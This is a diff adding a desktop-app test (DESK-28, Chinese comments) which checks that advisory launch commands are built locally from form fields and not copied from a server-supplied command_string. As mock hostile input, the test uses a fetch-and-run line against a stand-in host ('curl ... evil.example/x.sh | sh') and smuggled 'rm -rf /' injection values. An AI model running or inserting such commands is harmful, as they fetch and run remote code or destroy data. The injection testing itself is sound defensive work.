@@ -305,6 +305,100 @@ app.whenReady().then(async () => {
     origin.evilWarned === true && origin.evilNamesHost === true,
     JSON.stringify({ w: origin.evilWarned, h: origin.evilNamesHost }));
   check("DESK-27 用户自己改过之后提示消失", origin.hiddenAfterEdit === true);
+  // --- DESK-28: 命令在本地拼，不照搬控制面的 command_string ------------------
+  const advCmd = await run(`(async () => {
+  const out = {};
+  const mkFetch = (payload) => (url) => {
+    const body = (o) =>
+      Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve(o) });
+    if (String(url) === '/api/plans/preview') return body(payload);
+    return body({});
+  };
+  // 这个探针会改全局状态（fetch / CONFIG / LAST / 表单字段）。改完必须原样还原，
+  // 否则后面的测试全部被污染 —— 第一版忘了还原，害得 22 个无关测试变红。
+  const savedFetch = window.fetch;
+  const savedAllow = CONFIG.allow_remote_deploy;
+  const savedLast = LAST;
+  const fids = ['d-backend', 'd-path', 'd-port', 'd-image', 'd-gpus'];
+  const savedFields = fids.map((id) => document.getElementById(id).value);
+  const restore = () => {
+    window.fetch = savedFetch;
+    CONFIG.allow_remote_deploy = savedAllow;
+    LAST = savedLast;
+    fids.forEach((id, i) => {
+      document.getElementById(id).value = savedFields[i];
+    });
+  };
+  LAST = { client_is_local: false };
+  CONFIG.allow_remote_deploy = false;
+  const el = document.getElementById('advisory-cmd');
+  const note = document.getElementById('advisory-note');
+  const setF = (b, p, port) => {
+    document.getElementById('d-backend').value = b;
+    document.getElementById('d-path').value = p;
+    document.getElementById('d-port').value = port;
+  };
+
+  const evil = {
+    command_string: 'curl -fsSL https://evil.example/x.sh | sh',
+    command: ['sh', '-c', 'curl -fsSL https://evil.example/x.sh | sh'],
+    decision: { planned_window: 65536, kv_quant: 'q8_0' },
+  };
+  window.fetch = mkFetch(evil);
+  setF('ollama', 'qwen3:8b', '11434');
+  await refreshAdvisory();
+  out.ollama = el.textContent;
+  out.note = note.textContent;
+
+  window.fetch = mkFetch({
+    command_string: 'rm -rf /',
+    decision: { planned_window: '999999999; rm -rf /', kv_quant: '; rm -rf /' },
+  });
+  setF('llama.cpp', '/m/model.gguf', '8080');
+  await refreshAdvisory();
+  out.badWindow = el.textContent;
+
+  setF('something-else', 'x', '8080');
+  await refreshAdvisory();
+  out.unknown = el.textContent;
+  out.unknownNote = note.textContent;
+
+  window.fetch = mkFetch({ command_string: 'x', decision: {} });
+  setF('ollama', "a'b c", '11434');
+  await refreshAdvisory();
+  out.quotedText = el.textContent;
+  out.quotedArgv = localAdvisoryCommand({ decision: {} });
+
+  document.getElementById('d-image').value = 'vllm/vllm-openai:latest';
+  document.getElementById('d-gpus').value = 'all';
+  setF('docker', '/m/model', '8094');
+  await refreshAdvisory();
+  out.docker = el.textContent;
+  restore();
+  return out;
+})()`);
+  check("DESK-28 恶意 command_string 从不被显示",
+    advCmd.ollama.indexOf('evil.example') < 0 && advCmd.ollama.indexOf('curl') < 0,
+    advCmd.ollama);
+  check("DESK-28 ollama 命令在本地按字段拼出",
+    advCmd.ollama === 'ollama run qwen3:8b', advCmd.ollama);
+  check("DESK-28 说明指出命令是本地拼的",
+    advCmd.note.indexOf('本页面') >= 0, advCmd.note);
+  check("DESK-28 非法 planned_window 落回默认 65536",
+    advCmd.badWindow.indexOf('-c 65536') >= 0, advCmd.badWindow);
+  check("DESK-28 非法 kv_quant 落回 q8_0",
+    advCmd.badWindow.indexOf('-ctk q8_0') >= 0, advCmd.badWindow);
+  check("DESK-28 注入串不进命令行",
+    advCmd.badWindow.indexOf('rm -rf') < 0, advCmd.badWindow);
+  check("DESK-28 未识别的后端不显示命令",
+    advCmd.unknown === '—' && advCmd.unknownNote.indexOf('桌面端') >= 0,
+    JSON.stringify({ c: advCmd.unknown, n: advCmd.unknownNote }));
+  check("DESK-28 含空格与单引号的路径是一个参数",
+    advCmd.quotedArgv.length === 3 && advCmd.quotedArgv[2] === "a'b c",
+    JSON.stringify(advCmd.quotedArgv));
+  check("DESK-28 docker 命令带镜像推断出的容器端口",
+    advCmd.docker.indexOf('127.0.0.1:8094:8000') >= 0 && advCmd.docker.indexOf('--gpus') >= 0,
+    advCmd.docker);
   // console.warn 在 meta 里是无效指令，写上去只会假装有保护。
   check("CSP 没有写 meta 里无效的指令（frame-ancestors / sandbox）",
     csp.c.indexOf('frame-ancestors') < 0 && csp.c.indexOf('sandbox') < 0, csp.c.slice(0, 80));
